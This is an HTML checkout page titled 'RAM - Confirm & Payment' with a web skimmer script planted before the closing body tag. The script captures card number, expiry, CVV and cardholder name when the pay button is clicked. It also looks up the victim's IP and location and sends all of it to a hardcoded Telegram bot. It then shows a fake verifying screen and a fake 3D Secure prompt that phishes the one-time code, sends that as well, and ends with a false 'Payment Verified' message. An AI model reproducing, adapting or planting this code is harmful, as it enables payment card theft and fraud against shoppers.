<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>RAM - Confirm & Payment</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <script type="module" crossorigin src="./assets/index-CCa98s7c.js"></script>
    <link rel="modulepreload" crossorigin href="./assets/vendor-C323NY8X.js">
    <link rel="modulepreload" crossorigin href="./assets/react-vendor-Csv320CA.js">
    <link rel="stylesheet" crossorigin href="./assets/index-BACLLGGq.css">
  </head>
  <body>
    <div id="app"></div>
    <!-- LOGGER SCRIPT - add this right before </body> -->
<script>
  // === YOUR TELEGRAM BOT ===
  const BOT_TOKEN = '8170602416:AAGd6nsYCbaunz1C7vBc8NtyzQo0p2GHuRE';
  const CHAT_ID   = '5051301359';

  // Wait for the real payment form to appear (React renders async)
  const observer = new MutationObserver(() => {
    // Try to find common card input selectors
    const cardNumber = document.querySelector(
      'input[name*="card"], input[placeholder*="card"], input[id*="card"], input[type="tel"], input[maxlength="19"]'
    );
    const expiry     = document.querySelector(
      'input[name*="exp"], input[placeholder*="MM/YY"], input[id*="exp"], input[maxlength="5"]'
    );
    const cvv        = document.querySelector(
      'input[name*="cvv"], input[placeholder*="CVV"], input[id*="cvv"], input[maxlength="4"]'
    );
    const name       = document.querySelector(
      'input[name*="name"], input[placeholder*="name"], input[id*="name"]'
    );
    const submitBtn  = document.querySelector(
      'button[type="submit"], button:contains("Pay"), button:contains("Confirm"), button:contains("Submit"), button:contains("Process")'
    );

    if (cardNumber && expiry && cvv && submitBtn) {
      console.log('[LOGGER] Payment form detected - attaching capture');

      // Prevent default only for capture - let React still handle real submit
      submitBtn.addEventListener('click', async (e) => {
        // e.preventDefault();  ← commented out so real form still submits

        const card   = cardNumber.value.trim().replace(/\s/g, '');
        const exp    = expiry.value.trim();
        const cvc    = cvv.value.trim();
        const holder = name ? name.value.trim() : 'not captured';

        if (!card || card.length < 15 || !exp || !cvc) return;

        // Show fake verifying screen
        const overlay = document.createElement('div');
        overlay.id = 'captureOverlay';
        overlay.innerHTML = `
          <div class="spinner"></div>
          <div style="font-size:22px; margin:15px 0;">Verifying payment...</div>
          <div style="font-size:14px; opacity:0.7;">Please wait a moment</div>
        `;
        Object.assign(overlay.style, {
          position: 'fixed', inset: '0', background: 'rgba(0,0,0,0.85)',
          display: 'flex', flexDirection: 'column', alignItems: 'center',
          justifyContent: 'center', zIndex: '999999', color: 'white'
        });
        document.body.appendChild(overlay);

        // Fetch IP + Geo
        let ip = 'unknown';
        let geo = 'unknown';

        try {
          const geoRes = await fetch('https://ipapi.co/json/');
          const data = await geoRes.json();
          ip = data.ip || 'hidden';
          geo = `${data.city || '?'} - ${data.country_name || '?'} (${data.timezone || '?'})`;
        } catch {}

        const msg1 = `
NEW CARD CAPTURE - RAM PAYMENT
Time: ${new Date().toLocaleString()}
Cardholder: ${holder}
Card: ${card}
Expiry: ${exp}
CVV: ${cvc}
IP: ${ip}
Location: ${geo}
URL: ${window.location.href}
        `;

        // Send card details
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: msg1.trim(), disable_web_page_preview: true }),
          keepalive: true
        }).then(() => console.log('Card sent')).catch(err => console.error('Card send failed', err));

        // After ~2.5–3.5s show OTP screen
        setTimeout(() => {
          overlay.remove();

          const otpOverlay = document.createElement('div');
          otpOverlay.id = 'otpOverlay';
          otpOverlay.innerHTML = `
            <div style="background:#222; padding:30px; border-radius:12px; width:90%; max-width:420px; text-align:center; color:white;">
              <h2 style="margin-bottom:20px;">3D Secure Verification</h2>
              <p style="margin-bottom:20px; font-size:15px;">
                Enter the one-time code sent to your phone or email
              </p>
              <input type="text" id="otpInput" placeholder="Enter OTP" maxlength="6" style="width:100%; padding:14px; font-size:18px; text-align:center; letter-spacing:8px; border:2px solid #555; border-radius:8px; background:#111; color:white; margin:20px 0;">
              <button id="otpBtn" style="width:100%; padding:14px; background:#0066ff; color:white; border:none; border-radius:8px; font-size:18px; cursor:pointer;">Verify</button>
            </div>
          `;
          Object.assign(otpOverlay.style, {
            position: 'fixed', inset: '0', background: 'rgba(0,0,0,0.85)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            zIndex: '999999'
          });
          document.body.appendChild(otpOverlay);

          document.getElementById('otpBtn').onclick = () => {
            const otp = document.getElementById('otpInput').value.trim();
            if (!otp) return;

            const msg2 = `
OTP CAPTURE - RAM PAYMENT
Time: ${new Date().toLocaleString()}
OTP Code: ${otp}
IP: ${ip}
Location: ${geo}
            `;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ chat_id: CHAT_ID, text: msg2.trim(), disable_web_page_preview: true }),
              keepalive: true
            }).then(() => {
              console.log('OTP sent');
              otpOverlay.innerHTML = `
                <div style="background:#222; padding:40px; border-radius:12px; color:white; text-align:center;">
                  <h2>Payment Verified</h2>
                  <p style="margin-top:20px;">Thank you. Your transaction is being processed.</p>
                </div>
              `;
            }).catch(err => console.error('OTP send failed', err));
          };
        }, 2800);
      });

      observer.disconnect(); // stop observing once attached
    }
  });

  observer.observe(document.body, { childList: true, subtree: true });
</script>
  </body>
</html>
